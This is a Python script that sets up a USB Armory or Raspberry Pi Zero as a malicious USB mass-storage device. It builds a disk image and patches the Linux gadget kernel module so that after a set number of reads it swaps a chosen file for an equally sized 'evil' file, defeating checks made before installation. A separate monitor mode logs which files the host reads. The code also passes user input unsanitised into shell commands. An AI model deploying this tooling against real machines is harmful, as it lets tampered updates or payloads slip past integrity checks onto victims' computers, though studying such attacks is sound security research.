#!/usr/bin/python

from pathlib import Path
import os, subprocess, sys
import paramiko
import time
import getpass
import math


def main():
    content_file = "./content.zip"
    if not os.path.exists('./content'):
        os.makedirs('./content')
    if sys.argv[1] == "usbarmory":
        device_label = "USBArmory"
    elif sys.argv[1] == "pizero":
        device_label = "Raspberry Pi Zero"
        input(f"[?] Raspberry Pi will be downloading its kernel sources from the internet. Make sure that it has connectivity and press Enter.")

    device_ip = input(f"[?] Enter IP Address for {device_label} (for SSH connection): ").strip()
    device_username = input(f"[?] Enter username for {device_label} SSH user: ").strip()
    device_password = getpass.getpass(f"[?] Enter password for {device_label} SSH user: ")

    # Get content for the FS image
    process_content(content_file)

    # Create the FS image
    build_fs_image()

    # Parse the image and prepare the swtich statement
    if sys.argv[2] == "monitor":
        generate_monitor_code()
    elif sys.argv[2] == "attack":
        generate_attack_code()

    print("[*] Uploading the disk image and supporting scripts ...")
    upload_disk_and_scripts(device_username,device_password,device_ip)

    # Connect paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(device_ip, username=device_username, password=device_password, look_for_keys=False, allow_agent=False)
    # Get USB amory kernel version
    exit_status, stdout = runSSHCommand(client,'uname -r | cut -d"-" -f1')  
    kernel_version = stdout.strip() # First line

    print("[*] Preparing the kernel source code ...")
    if sys.argv[1] == "usbarmory":
        armory_prepare_and_compile(client,kernel_version,device_username,device_password,device_ip)
    elif sys.argv[1] == "pizero":
        pi_prepare_and_compile(client,kernel_version,device_username,device_password,device_ip)

    if sys.argv[1] == "usbarmory":
        print("[*] Checking current setup of the USBArmory USB gadget ...")
        armory_usb_gadget_mode_config(client)
    elif sys.argv[1] == "pizero":
        print("[*] Configuring the Pi to act as USB mass storage device ...")
        pi_usb_gadget_mode_config(client)
    print(f"[*] Rebooting the {device_label} ...")
    reboot(client)
    print("[*] Removing useless files ... ")
    cleanup()

def build_fs_image():
    allocate_size = int(subprocess.getoutput(f"du -sm ./content/ | cut -f1")) + 50
    print("[*] Building file system image from the supplied content ...")
    os.system(f"dd bs=1M if=/dev/zero of=./disk.img count={allocate_size} >/dev/null 2>&1")
    os.system(f"mkdosfs ./disk.img -F 32 -I >/dev/null 2>&1")
    os.system("mkdir /tmp/evil_update_mount >/dev/null 2>&1")
    os.system("mount -t vfat -o rw ./disk.img /tmp/evil_update_mount/ >/dev/null 2>&1")
    print("[*] Copying files from the disk content ... ")
    os.system("cp -r ./content/* /tmp/evil_update_mount/")
    os.system("sync")
    os.system("umount /tmp/evil_update_mount")
    

def process_content(content_file):
    use_zip = False
    if os.listdir(path='./content/'):
        answer = input("[?] Do you want to use the current contents of the './content/' folder? [y/n]: ").lower().strip()
        if answer == "n":
            use_zip = True
    else:
        use_zip = True
    if use_zip:
        content_file = input("[?] Enter full path to the ZIP file with disk image contents: ").strip()
        print("[*] Cleaning up ... ")
        os.system("rm -rf ./content/*")
        print("[*] Unzipping the disk content ...")
        os.system(f"unzip {content_file} -d ./content/ >/dev/null 2>&1")

def generate_attack_code():
    if sys.argv[1] == "usbarmory":
        device = "usbarmory"
    elif sys.argv[1] == "pizero":
        device = "pi"
    to_be_replaced = input("[?] Enter path to the file that should be replaced: ./content/").strip()
    evil_file = input("[?] Enter path to the 'evil' file (keep in mind that its size has to be identical to original one): ").strip()
    replace_after = input("[?] When should the replace happen (enter number which represents which read shoud be the first one with 'evil' file): ").strip()
    print("[*] Loading original image ... ")
    with open("./disk.img","rb") as f:
        image_content = f.read()
    print("[*] Image loaded")
    with open(f"./content/{to_be_replaced}",'rb') as current_file:
        orig_file_content = current_file.read()
        offset = image_content.find(orig_file_content)
    print("[*] Adjusting the kernel module source code ...")
    output = f"""
    if (file_offset == {offset}){{
		if (++read_counter >= {replace_after}) {{
			curlun->filp = evil_file;
            //flip = 1;
			printk("[EVIL_UPDATE] Switching file pointers!\\n");
		}}
		printk("[EVIL_UPDATE] Incremented counter to: %d\\n",read_counter);
	}}
    """
    with open("f_mass_storage_attack_template.c","r") as template_file:
        template_content = template_file.read()
        with open("./f_mass_storage.c","w") as out_file:
            out_file.write(template_content.replace("//PLACEHOLDER_SWITCH",output).replace("REPLACE_WITH_DEVICE",device))
    print("[*] Generating 'evil.img' ... ")
    with open(evil_file,"rb") as evil_content_file:
        evil_content = evil_content_file.read()
    if len(orig_file_content) != len(evil_content):
        print("[!] Evil and original file sizes do not match!")
        exit(1)
    
    with open("./evil.img","wb") as evil_img:
        evil_img.write(image_content.replace(orig_file_content,evil_content))
    print("[*] Done!")

    

def generate_monitor_code():
    print("[*] Loading created image ... ")
    with open("./disk.img","rb") as f:
        image_content = f.read()

    print("[*] Image loaded")
    pathlist = Path("./content/").rglob('*')
    files=""
    for path in pathlist:
        print(f"[*] Processing file: {str(path).replace('content/','')}")
        path_in_str = str(path)
        if os.path.isfile(path_in_str):
            with open(path_in_str,'rb') as current_file:
                offset = 0
                current_file_content = current_file.read()
                while True:
                    offset = image_content.find(current_file_content,offset)
                    if offset == -1:
                        break
                    files += f"\tcase {offset}:\n\t\tprintk(KERN_INFO \"[EVIL_UPDATE] Start of file '{path_in_str.replace('content/','')}' read!\\n\");\n\t\tbreak;\n"
                    offset += len(current_file_content)

    output = f"""
    switch(file_offset){{
    {files}
    \tdefault:
    \t\tbreak;
    }}
    """
    print("[*] Updating the kernel module source ...")
    with open("f_mass_storage_monitor_template.c","r") as template_file:
        template_content = template_file.read()
        with open("./f_mass_storage.c","w") as out_file:
            out_file.write(template_content.replace("//PLACEHOLDER_SWITCH",output))

def upload_disk_and_scripts(device_username,device_password,device_ip):
    if sys.argv[1] == "usbarmory":
        device = "usbarmory"
    elif sys.argv[1] == "pizero":
        device = "pi"
    os.system(f"curl --insecure --user {device_username}:{device_password} -T ./disk.img sftp://{device_ip}/home/{device}/disk.img")
    os.system(f"curl --insecure --user {device_username}:{device_password} -T ./{device}_get_kernel.sh sftp://{device_ip}/home/{device}/{device}_get_kernel.sh 2>/dev/null")
    os.system(f"curl --insecure --user {device_username}:{device_password} -T ./{device}_compile_module.sh sftp://{device_ip}/home/{device}/{device}_compile_module.sh 2>/dev/null")
    if sys.argv[2] == "attack":
        os.system(f"curl --insecure --user {device_username}:{device_password} -T ./evil.img sftp://{device_ip}/home/{device}/evil.img")


def armory_prepare_and_compile(client,kernel_version,device_username,device_password,device_ip):
    if not os.path.isfile(f"./linux-{kernel_version}.tar.xz"):
        os.system(f"wget https://www.kernel.org/pub/linux/kernel/v5.x/linux-{kernel_version}.tar.xz -O ./linux-{kernel_version}.tar.xz 2>/dev/null")
    exit_status, linux_source = runSSHCommand(client,'ls /home/usbarmory/kernel.check')
    if not linux_source:
        os.system(f"curl --insecure --user {device_username}:{device_password} -T ./linux-{kernel_version}.tar.xz sftp://{device_ip}/home/usbarmory/linux.tar.xz 2>/dev/null")

    exit_status, stdout = runSSHCommand(client,'/bin/bash /home/usbarmory/usbarmory_get_kernel.sh')
    if exit_status != 0:
        print("[!] ERROR!!!")
        exit()

    print("[*] Uploading the altered kernel module source code ...")
    os.system(f"curl --insecure --user {device_username}:{device_password} -T ./f_mass_storage.c sftp://{device_ip}/home/usbarmory/linux-{kernel_version}/drivers/usb/gadget/function/f_mass_storage.c 2>/dev/null")
    print("[*] Compiling the kernel module ...")
    exit_status, stdout = runSSHCommand(client,'sudo /bin/bash /home/usbarmory/usbarmory_compile_module.sh')
    if exit_status != 0:
        print("[!] ERROR!!!")
        exit()

def pi_prepare_and_compile(client,kernel_version,device_username,device_password,device_ip):
    exit_status, stdout = runSSHCommand(client,'sudo apt update && sudo apt -y install git bc bison flex libssl-dev make')
    if exit_status != 0:
        print("[!] Update and installing failed! Is internet connectivity and current time on the Pi correct?")
        exit()
    exit_status, stdout = runSSHCommand(client,'/bin/bash /home/pi/pi_get_kernel.sh')
    if exit_status != 0:
        print("[!] ERROR!!!")
        exit()
    print("[*] Uploading the altered kernel module source code ...")
    os.system(f"curl --insecure --user {device_username}:{device_password} -T ./f_mass_storage.c sftp://{device_ip}/home/pi/linux/drivers/usb/gadget/function/f_mass_storage.c 2>/dev/null")
    print("[*] Compiling the kernel module ...")
    exit_status, stdout = runSSHCommand(client,'sudo /bin/bash /home/pi/pi_compile_module.sh')
    if exit_status != 0:
        print("[!] ERROR!!!")
        exit()


def reboot(client):
    runSSHCommand(client,'sudo reboot')


def pi_usb_gadget_mode_config(client):
    # This will automatically add confifguration parameters to the RPi (if not there already)
    exit_status, config_content = runSSHCommand(client,'cat /boot/config.txt')
    if not "dtoverlay=dwc2" in config_content:
        runSSHCommand(client,"sudo sh -c \"echo 'dtoverlay=dwc2' >> /boot/config.txt\"")

    exit_status, modules_content = runSSHCommand(client,'cat /etc/modules')    
    if not "dwc2" in modules_content:
        runSSHCommand(client,"sudo sh -c \"echo 'dwc2' >> /etc/modules\"")
    if not "g_mass_storage" in modules_content:
        runSSHCommand(client,"sudo sh -c \"echo 'g_mass_storage' >> /etc/modules\"")
        runSSHCommand(client,"sudo sh -c \"echo 'options g_mass_storage file=/home/pi/disk.img stall=0 ro=1' > /etc/modprobe.d/g_mass_storage.conf\"")

def armory_usb_gadget_mode_config(client):
    exit_status, modules_content = runSSHCommand(client,'cat /etc/modules')  
    modules_content = modules_content.replace("\n","\\n")
    if "g_multi" in modules_content:
        current_config = "g_multi"
        print("[*] Device currently configured to use multi gadget (both mass storage and network) ...")
    elif "g_mass_storage" in modules_content:
        current_config = "g_mass_storage"
        print("[*] Device currently configured pose as mass storage device only ...")
    elif "g_ether" in modules_content:
        current_config = "g_ether"
        print("[!] Ethernet only!")

    answer = input(f"[?] Do you want to change current configuration of the USB gadget mode?\n\t[L]eave as is ({current_config})/[M]ulti/[S]torage only:").lower().strip()
    if answer == "l":
        print("[*] Nothing to do :)")
    elif answer == "m":
        print("[*] Configuring multi gadget ...")
        modules_content = modules_content.replace(current_config,"g_multi")
        runSSHCommand(client,f"sudo sh -c \"echo '{modules_content}' > /etc/modules\"")
        modprobe_content = "options g_multi use_eem=0 dev_addr=aa:bb:cc:dd:ee:f1 host_addr=aa:bb:cc:dd:ee:f2 file=/home/usbarmory/disk.img\\nblacklist sahara"
        runSSHCommand(client,f"sudo sh -c \"echo '{modprobe_content}' > /etc/modprobe.d/usbarmory.conf\"")
        # flush DHCP leases
        runSSHCommand(client,"sudo sh -c \"echo 'authoring-byte-order little-endian;' > /var/lib/dhcp/dhcpd.leases\"")
    elif answer == "s":
        print("[*] Configuring storage gadget ...")
        modules_content = modules_content.replace(current_config,"g_mass_storage")
        runSSHCommand(client,f"sudo sh -c \"echo '{modules_content}' > /etc/modules\"")
        modprobe_content = "options g_mass_storage file=/home/usbarmory/disk.img\\nblacklist sahara"
        runSSHCommand(client,f"sudo sh -c \"echo '{modprobe_content}' > /etc/modprobe.d/usbarmory.conf\"")
    else:
        print("[!] Invalid choice! Bye ...")
        exit()

def cleanup():
    os.remove("./disk.img")
    os.remove("./f_mass_storage.c")
    if sys.argv[2] == "attack":
        os.remove("./evil.img")

def runSSHCommand(client, command):
    stdin, stdout, stderr = client.exec_command(command)
    exit_status = stdout.channel.recv_exit_status()
    stdin.close()
    if exit_status == 0:
        return exit_status,''.join(stdout.readlines())
    else:
        return exit_status, ""

# Handle proper execution
if __name__ == "__main__":
    if len(sys.argv) != 3 or (len(sys.argv) == 3 and not (sys.argv[2] == "attack" or sys.argv[2] == "monitor") and not (sys.argv[1] == "pizero" or sys.argv[1] == "usbarmory")):
        print("[!] Invalid arguments!")
        print(f"[*] Usage: {sys.argv[0]} <pizero|usbarmory> <attack|monitor>")
        exit(1)
    if not 'SUDO_UID' in os.environ.keys():
        print("[!] This program needs to be run with 'sudo'!")
        exit(1)
    main()